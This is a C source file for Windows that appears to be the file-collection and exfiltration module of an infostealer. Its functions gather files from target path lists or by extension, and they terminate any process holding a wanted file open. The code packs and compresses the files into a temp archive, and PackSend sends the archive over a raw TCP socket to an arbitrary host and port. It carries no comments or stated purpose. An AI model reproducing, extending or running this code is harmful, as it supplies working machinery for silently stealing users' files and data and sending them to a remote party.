#include "pack.h"

Pack* PackCreate()
{
    Pack* pack = malloc(sizeof(Pack));
    NULL_RET(pack, NULL);

    pack->file = INVALID_HANDLE_VALUE;
    pack->path = malloc(MAX_PATH);
    NULL_RET(pack->path, NULL);

    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0)  return NULL;
    if (GetTempFileNameA(tempPath, "pack", 0, pack->path) == 0)  return NULL;

    pack->file = CreateFileA(pack->path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); \
    PACK_HANDLE_RESET(pack);
    
    return pack;
}

bool PackCompress(Pack** in)
{
    PACK_HANDLE_RESET((*in));
    PACK_HANDLE_CHECK((*in), GENERIC_READ, FILE_SHARE_READ, false);

    LARGE_INTEGER file_size;
    if (!GetFileSizeEx((*in)->file, &file_size))
    {
        PACK_HANDLE_RESET((*in));
        return false;
    }

    size_t in_size = file_size.QuadPart;
    BYTE* in_buffer = malloc(in_size);
    if (!in_buffer)
    {
        PACK_HANDLE_RESET((*in));
        return false;
    }

    DWORD bytes_read = 0;
    if (!ReadFile((*in)->file, in_buffer, in_size, &bytes_read, NULL))
    {
        free(in_buffer);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    if (bytes_read != in_size)
    {
        free(in_buffer);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    COMPRESSOR_HANDLE hCompressor = NULL;
    if (!CreateCompressor(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &hCompressor))
    {
        free(in_buffer);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    
    size_t new_out_size = 0;
    size_t out_size = file_size.QuadPart;
    BYTE* out_buffer = malloc(out_size);

    if (!out_buffer)
    {
        free(in_buffer);
        CloseCompressor(hCompressor);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    if (!Compress(hCompressor, in_buffer, file_size.QuadPart, out_buffer, out_size, &new_out_size))
    {
        free(out_buffer);
        free(in_buffer);
        CloseCompressor(hCompressor);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    out_buffer = realloc(out_buffer, new_out_size);
    free(in_buffer);
    CloseCompressor(hCompressor);

    Pack* out = PackCreate();
    if (!out)
    {
        free(out_buffer);
        PACK_HANDLE_RESET((*in));
        return false;
    }
    
    out->file = CreateFileA(out->path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out->file == INVALID_HANDLE_VALUE)
    {
        free(out_buffer);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    DWORD bytes_written = 0;
    if (!WriteFile(out->file, out_buffer, new_out_size, &bytes_written, NULL))
    {
        free(out_buffer);
        PackDestroy(out);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    if (bytes_written != new_out_size)
    {
        free(out_buffer);
        PackDestroy(out);
        PACK_HANDLE_RESET((*in));
        return false;
    }

    free(out_buffer);
    PackDestroy((*in));
    
    *in = out;
    PACK_HANDLE_RESET((*in));

    return true;
}

bool PackWriteFile(Pack* pack, const char* path)
{
    PACK_HANDLE_RESET(pack);
    PACK_HANDLE_CHECK(pack, FILE_APPEND_DATA, 0, false);

    if (IsFileBusy(path))
    {
        if (!TerminateBusyFileProc(path))
        {
            PACK_HANDLE_RESET(pack);
            return false;
        }
    }

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    {
        PACK_HANDLE_RESET(pack);
        return false;
    }

    if (!WriteFile(pack->file, path, strlen(path) + 1, NULL, NULL))
    {
        CloseHandle(hFile);
        PACK_HANDLE_RESET(pack);
        return false;
    }

    LARGE_INTEGER lgint;
    if (!GetFileSizeEx(hFile, &lgint))
    {
        CloseHandle(hFile);
        PACK_HANDLE_RESET(pack);
        return false;
    }
    
    size_t file_size = lgint.QuadPart;
    if (!WriteFile(pack->file, &file_size, sizeof(size_t), NULL, NULL))
    {
        CloseHandle(hFile);
        PACK_HANDLE_RESET(pack);
        return false;
    }

    BYTE buffer[BUFFER_SIZE];
    DWORD bytes_read = 0;

    while (ReadFile(hFile, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) 
    {
        DWORD bytes_written = 0;
        if (!WriteFile(pack->file, buffer, bytes_read, &bytes_written, NULL) || bytes_written != bytes_read) 
        {
            CloseHandle(hFile);
            PACK_HANDLE_RESET(pack);
            return false;
        }
    }

    CloseHandle(hFile);
    PACK_HANDLE_RESET(pack);
    return true;
}

bool PackWriteBuffer(Pack* pack, const char* name, const char* buffer, size_t len)
{
    PACK_HANDLE_RESET(pack);
    PACK_HANDLE_CHECK(pack, FILE_APPEND_DATA, 0, false);
    
    DWORD  out_size = (DWORD)strlen(name) + 1;
    if (!WriteFile(pack->file, name, out_size, NULL, NULL))
    {
        PACK_HANDLE_RESET(pack);
        return false;
    }

    if (!WriteFile(pack->file, &len, sizeof(LONGLONG), NULL, NULL))
    {
        PACK_HANDLE_RESET(pack);
        return false;
    }


    DWORD bytes_written;
    if (!WriteFile(pack->file, buffer, len, &bytes_written, NULL) || bytes_written != len)
    {
        PACK_HANDLE_RESET(pack);
        return false;
    }

    PACK_HANDLE_RESET(pack);
    return true;
}

void PackDestroy(Pack* pack)
{
    NULL_RET(pack, );

    PACK_HANDLE_RESET(pack);

    if (PathFileExistsA(pack->path))
    {
        DeleteFileA(pack->path);
        free(pack->path);
    }
    free(pack);
}

bool PackSend(Pack* pack, const char* host, unsigned short port)
{
    PACK_HANDLE_RESET(pack);
    PACK_HANDLE_CHECK(pack, GENERIC_READ, FILE_SHARE_READ, false);
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        PACK_HANDLE_RESET(pack);
        return false;
    }

    SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client == INVALID_SOCKET)
    {
        WSACleanup();
        PACK_HANDLE_RESET(pack);
        return false;
    }

    struct sockaddr_in client_addr;
    ZeroMemory(&client_addr, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &client_addr.sin_addr);

    if (connect(client, (struct sockaddr*)&client_addr, sizeof(client_addr)) == SOCKET_ERROR)
    {
        closesocket(client);
        WSACleanup();
        PACK_HANDLE_RESET(pack);
        return false;
    }

    char buffer[BUFFER_SIZE];
    DWORD bytesRead;
    while (ReadFile(pack->file, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
    {
        if (send(client, buffer, bytesRead, 0) == SOCKET_ERROR)
        {
            closesocket(client);
            WSACleanup();
            PACK_HANDLE_RESET(pack);
            return false;
        }
    }

    closesocket(client);
    WSACleanup();
    PACK_HANDLE_RESET(pack);
    return true;
}

void PackTargetFiles(Pack* pack, char* base, char** targets, size_t len)
{
    for (size_t k = 0; k < len; k++)
    {
        char inpath[MAX_PATH];
        if (!PathCombineA(inpath, base, targets[k])) continue;
        if (!PathFileExistsA(inpath)) continue;

        PackWriteFile(pack, inpath);
    }
}

void PackDirectoryFiles(Pack* pack, char* dirpath, char** extensions, size_t len)
{
    char* search_path = (char*)malloc(strlen(dirpath) + 3);
    NULL_RET(search_path, );

    strcpy(search_path, dirpath);
    strcat(search_path, "\\*");

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search_path, &findData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        free(search_path);
        return;
    }

    do
    {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            char* ext = PathFindExtensionA(findData.cFileName);
            for (size_t i = 0; i < len; i++)
            {
                if (strcmp(ext, extensions[i]) == 0)
                {
                    char file_path[MAX_PATH];
                    PathCombineA(file_path, dirpath, findData.cFileName);
                    PackWriteFile(pack, file_path);
                    break;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData) != 0);

    free(search_path);
    FindClose(hFind);
}
